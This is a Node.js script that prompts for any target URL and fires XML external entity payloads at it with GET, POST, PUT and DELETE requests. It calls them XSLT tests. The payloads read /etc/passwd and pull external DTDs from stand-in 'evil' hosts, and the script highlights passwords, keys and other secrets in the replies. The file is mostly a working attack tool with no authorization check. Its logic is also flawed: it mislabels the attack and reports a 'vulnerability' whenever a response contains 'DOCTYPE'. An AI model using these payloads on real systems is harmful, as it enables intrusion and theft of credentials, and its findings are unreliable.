const http = require('http');
const https = require('https');
const readline = require('readline');

// Create readline interface
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Payloads to test for XSLT vulnerability
const payloads = [
    `<?xml version="1.0"?>
     <!DOCTYPE foo [
         <!ENTITY xxe SYSTEM "file:///etc/passwd">
     ]>
     <foo>&xxe;</foo>`,

    `<?xml version="1.0"?>
     <!DOCTYPE foo [
         <!ENTITY % xxe SYSTEM "file:///etc/passwd">
         <!ENTITY sensitiveData SYSTEM "http://example.com/sensitive-data.xml">
         %xxe;
     ]>
     <foo>&sensitiveData;</foo>`,

    `<?xml version="1.0"?>
     <!DOCTYPE foo PUBLIC "-//OXML/EN" "http://example.com/o.dtd">
     <foo></foo>`,

    `<!DOCTYPE foo SYSTEM "http://example.com/evil.dtd">
     <foo></foo>`,

    `<?xml version="1.0"?>
     <!DOCTYPE foo [
         <!ENTITY % data SYSTEM "file:///etc/passwd">
         <!ENTITY % param1 "<!ENTITY &#37; unparsed SYSTEM 'http://example.com/evil.xml'"> 
         %param1;
         %data;
     ]>
     <foo></foo>`,
     
    // Add more payloads as needed
];

// HTTP methods to test
const methods = ['GET', 'POST', 'PUT', 'DELETE'];

// Sensitive keywords to highlight
const sensitiveKeywords = ['password', 'username', 'credit_card', 'ssn', 'connection_string', 'secret_key', 'private_key', 'api_key'];

// Function to send HTTP request
function sendHttpRequest(url, method, payload) {
    const options = {
        method: method,
        headers: {
            'Content-Type': 'application/xml'
        }
    };

    return new Promise((resolve, reject) => {
        const client = url.startsWith('https') ? https : http;
        const req = client.request(url, options, (res) => {
            let responseData = '';

            res.on('data', (chunk) => {
                responseData += chunk;
            });

            res.on('end', () => {
                resolve({ response: responseData, statusCode: res.statusCode });
            });
        });

        req.on('error', (error) => {
            reject(error);
        });

        if (method === 'POST' || method === 'PUT') {
            req.write(payload);
        }

        req.end();
    });
}

// Function to test for XSLT vulnerability
async function testXSLTVulnerability(targetURL) {
    let isVulnerable = false;

    for (let i = 0; i < methods.length; i++) {
        const method = methods[i];
        for (let j = 0; j < payloads.length; j++) {
            const payload = payloads[j];
            try {
                console.log(`Testing XSLT vulnerability for: ${targetURL} using method: ${method}`);
                const { response, statusCode } = await sendHttpRequest(targetURL, method, payload);
                if (statusCode === 200 && response.includes('DOCTYPE')) {
                    console.log(`Vulnerability confirmed for method ${method} and payload ${j + 1}`);
                    isVulnerable = true;
                    console.log("Vulnerable Response Content:");
                    highlightSensitiveInfo(response);
                }
            } catch (error) {
                console.error(`Error while sending payload ${j + 1} using method ${method}: ${error.message}`);
            }
        }
    }

    if (!isVulnerable) {
        console.log("No XSLT vulnerability detected.");
    } else {
        console.log("To test the vulnerability, you can try exploiting it using various payloads and HTTP methods.");
    }
}

// Function to highlight sensitive information in the response content
function highlightSensitiveInfo(response) {
    // Highlight sensitive information
    sensitiveKeywords.forEach(keyword => {
        const regex = new RegExp(`\\b${keyword}\\b`, 'gi');
        response = response.replace(regex, (match) => `\x1b[31m${match}\x1b[0m`);
    });

    console.log(response);
}

// Ask user to enter target website URL
rl.question("Enter your target website URL: ", (targetURL) => {
    // Close the interface
    rl.close();

    // Validate targetURL
    if (targetURL) {
        testXSLTVulnerability(targetURL);
    } else {
        console.log("Invalid target website URL.");
    }
});
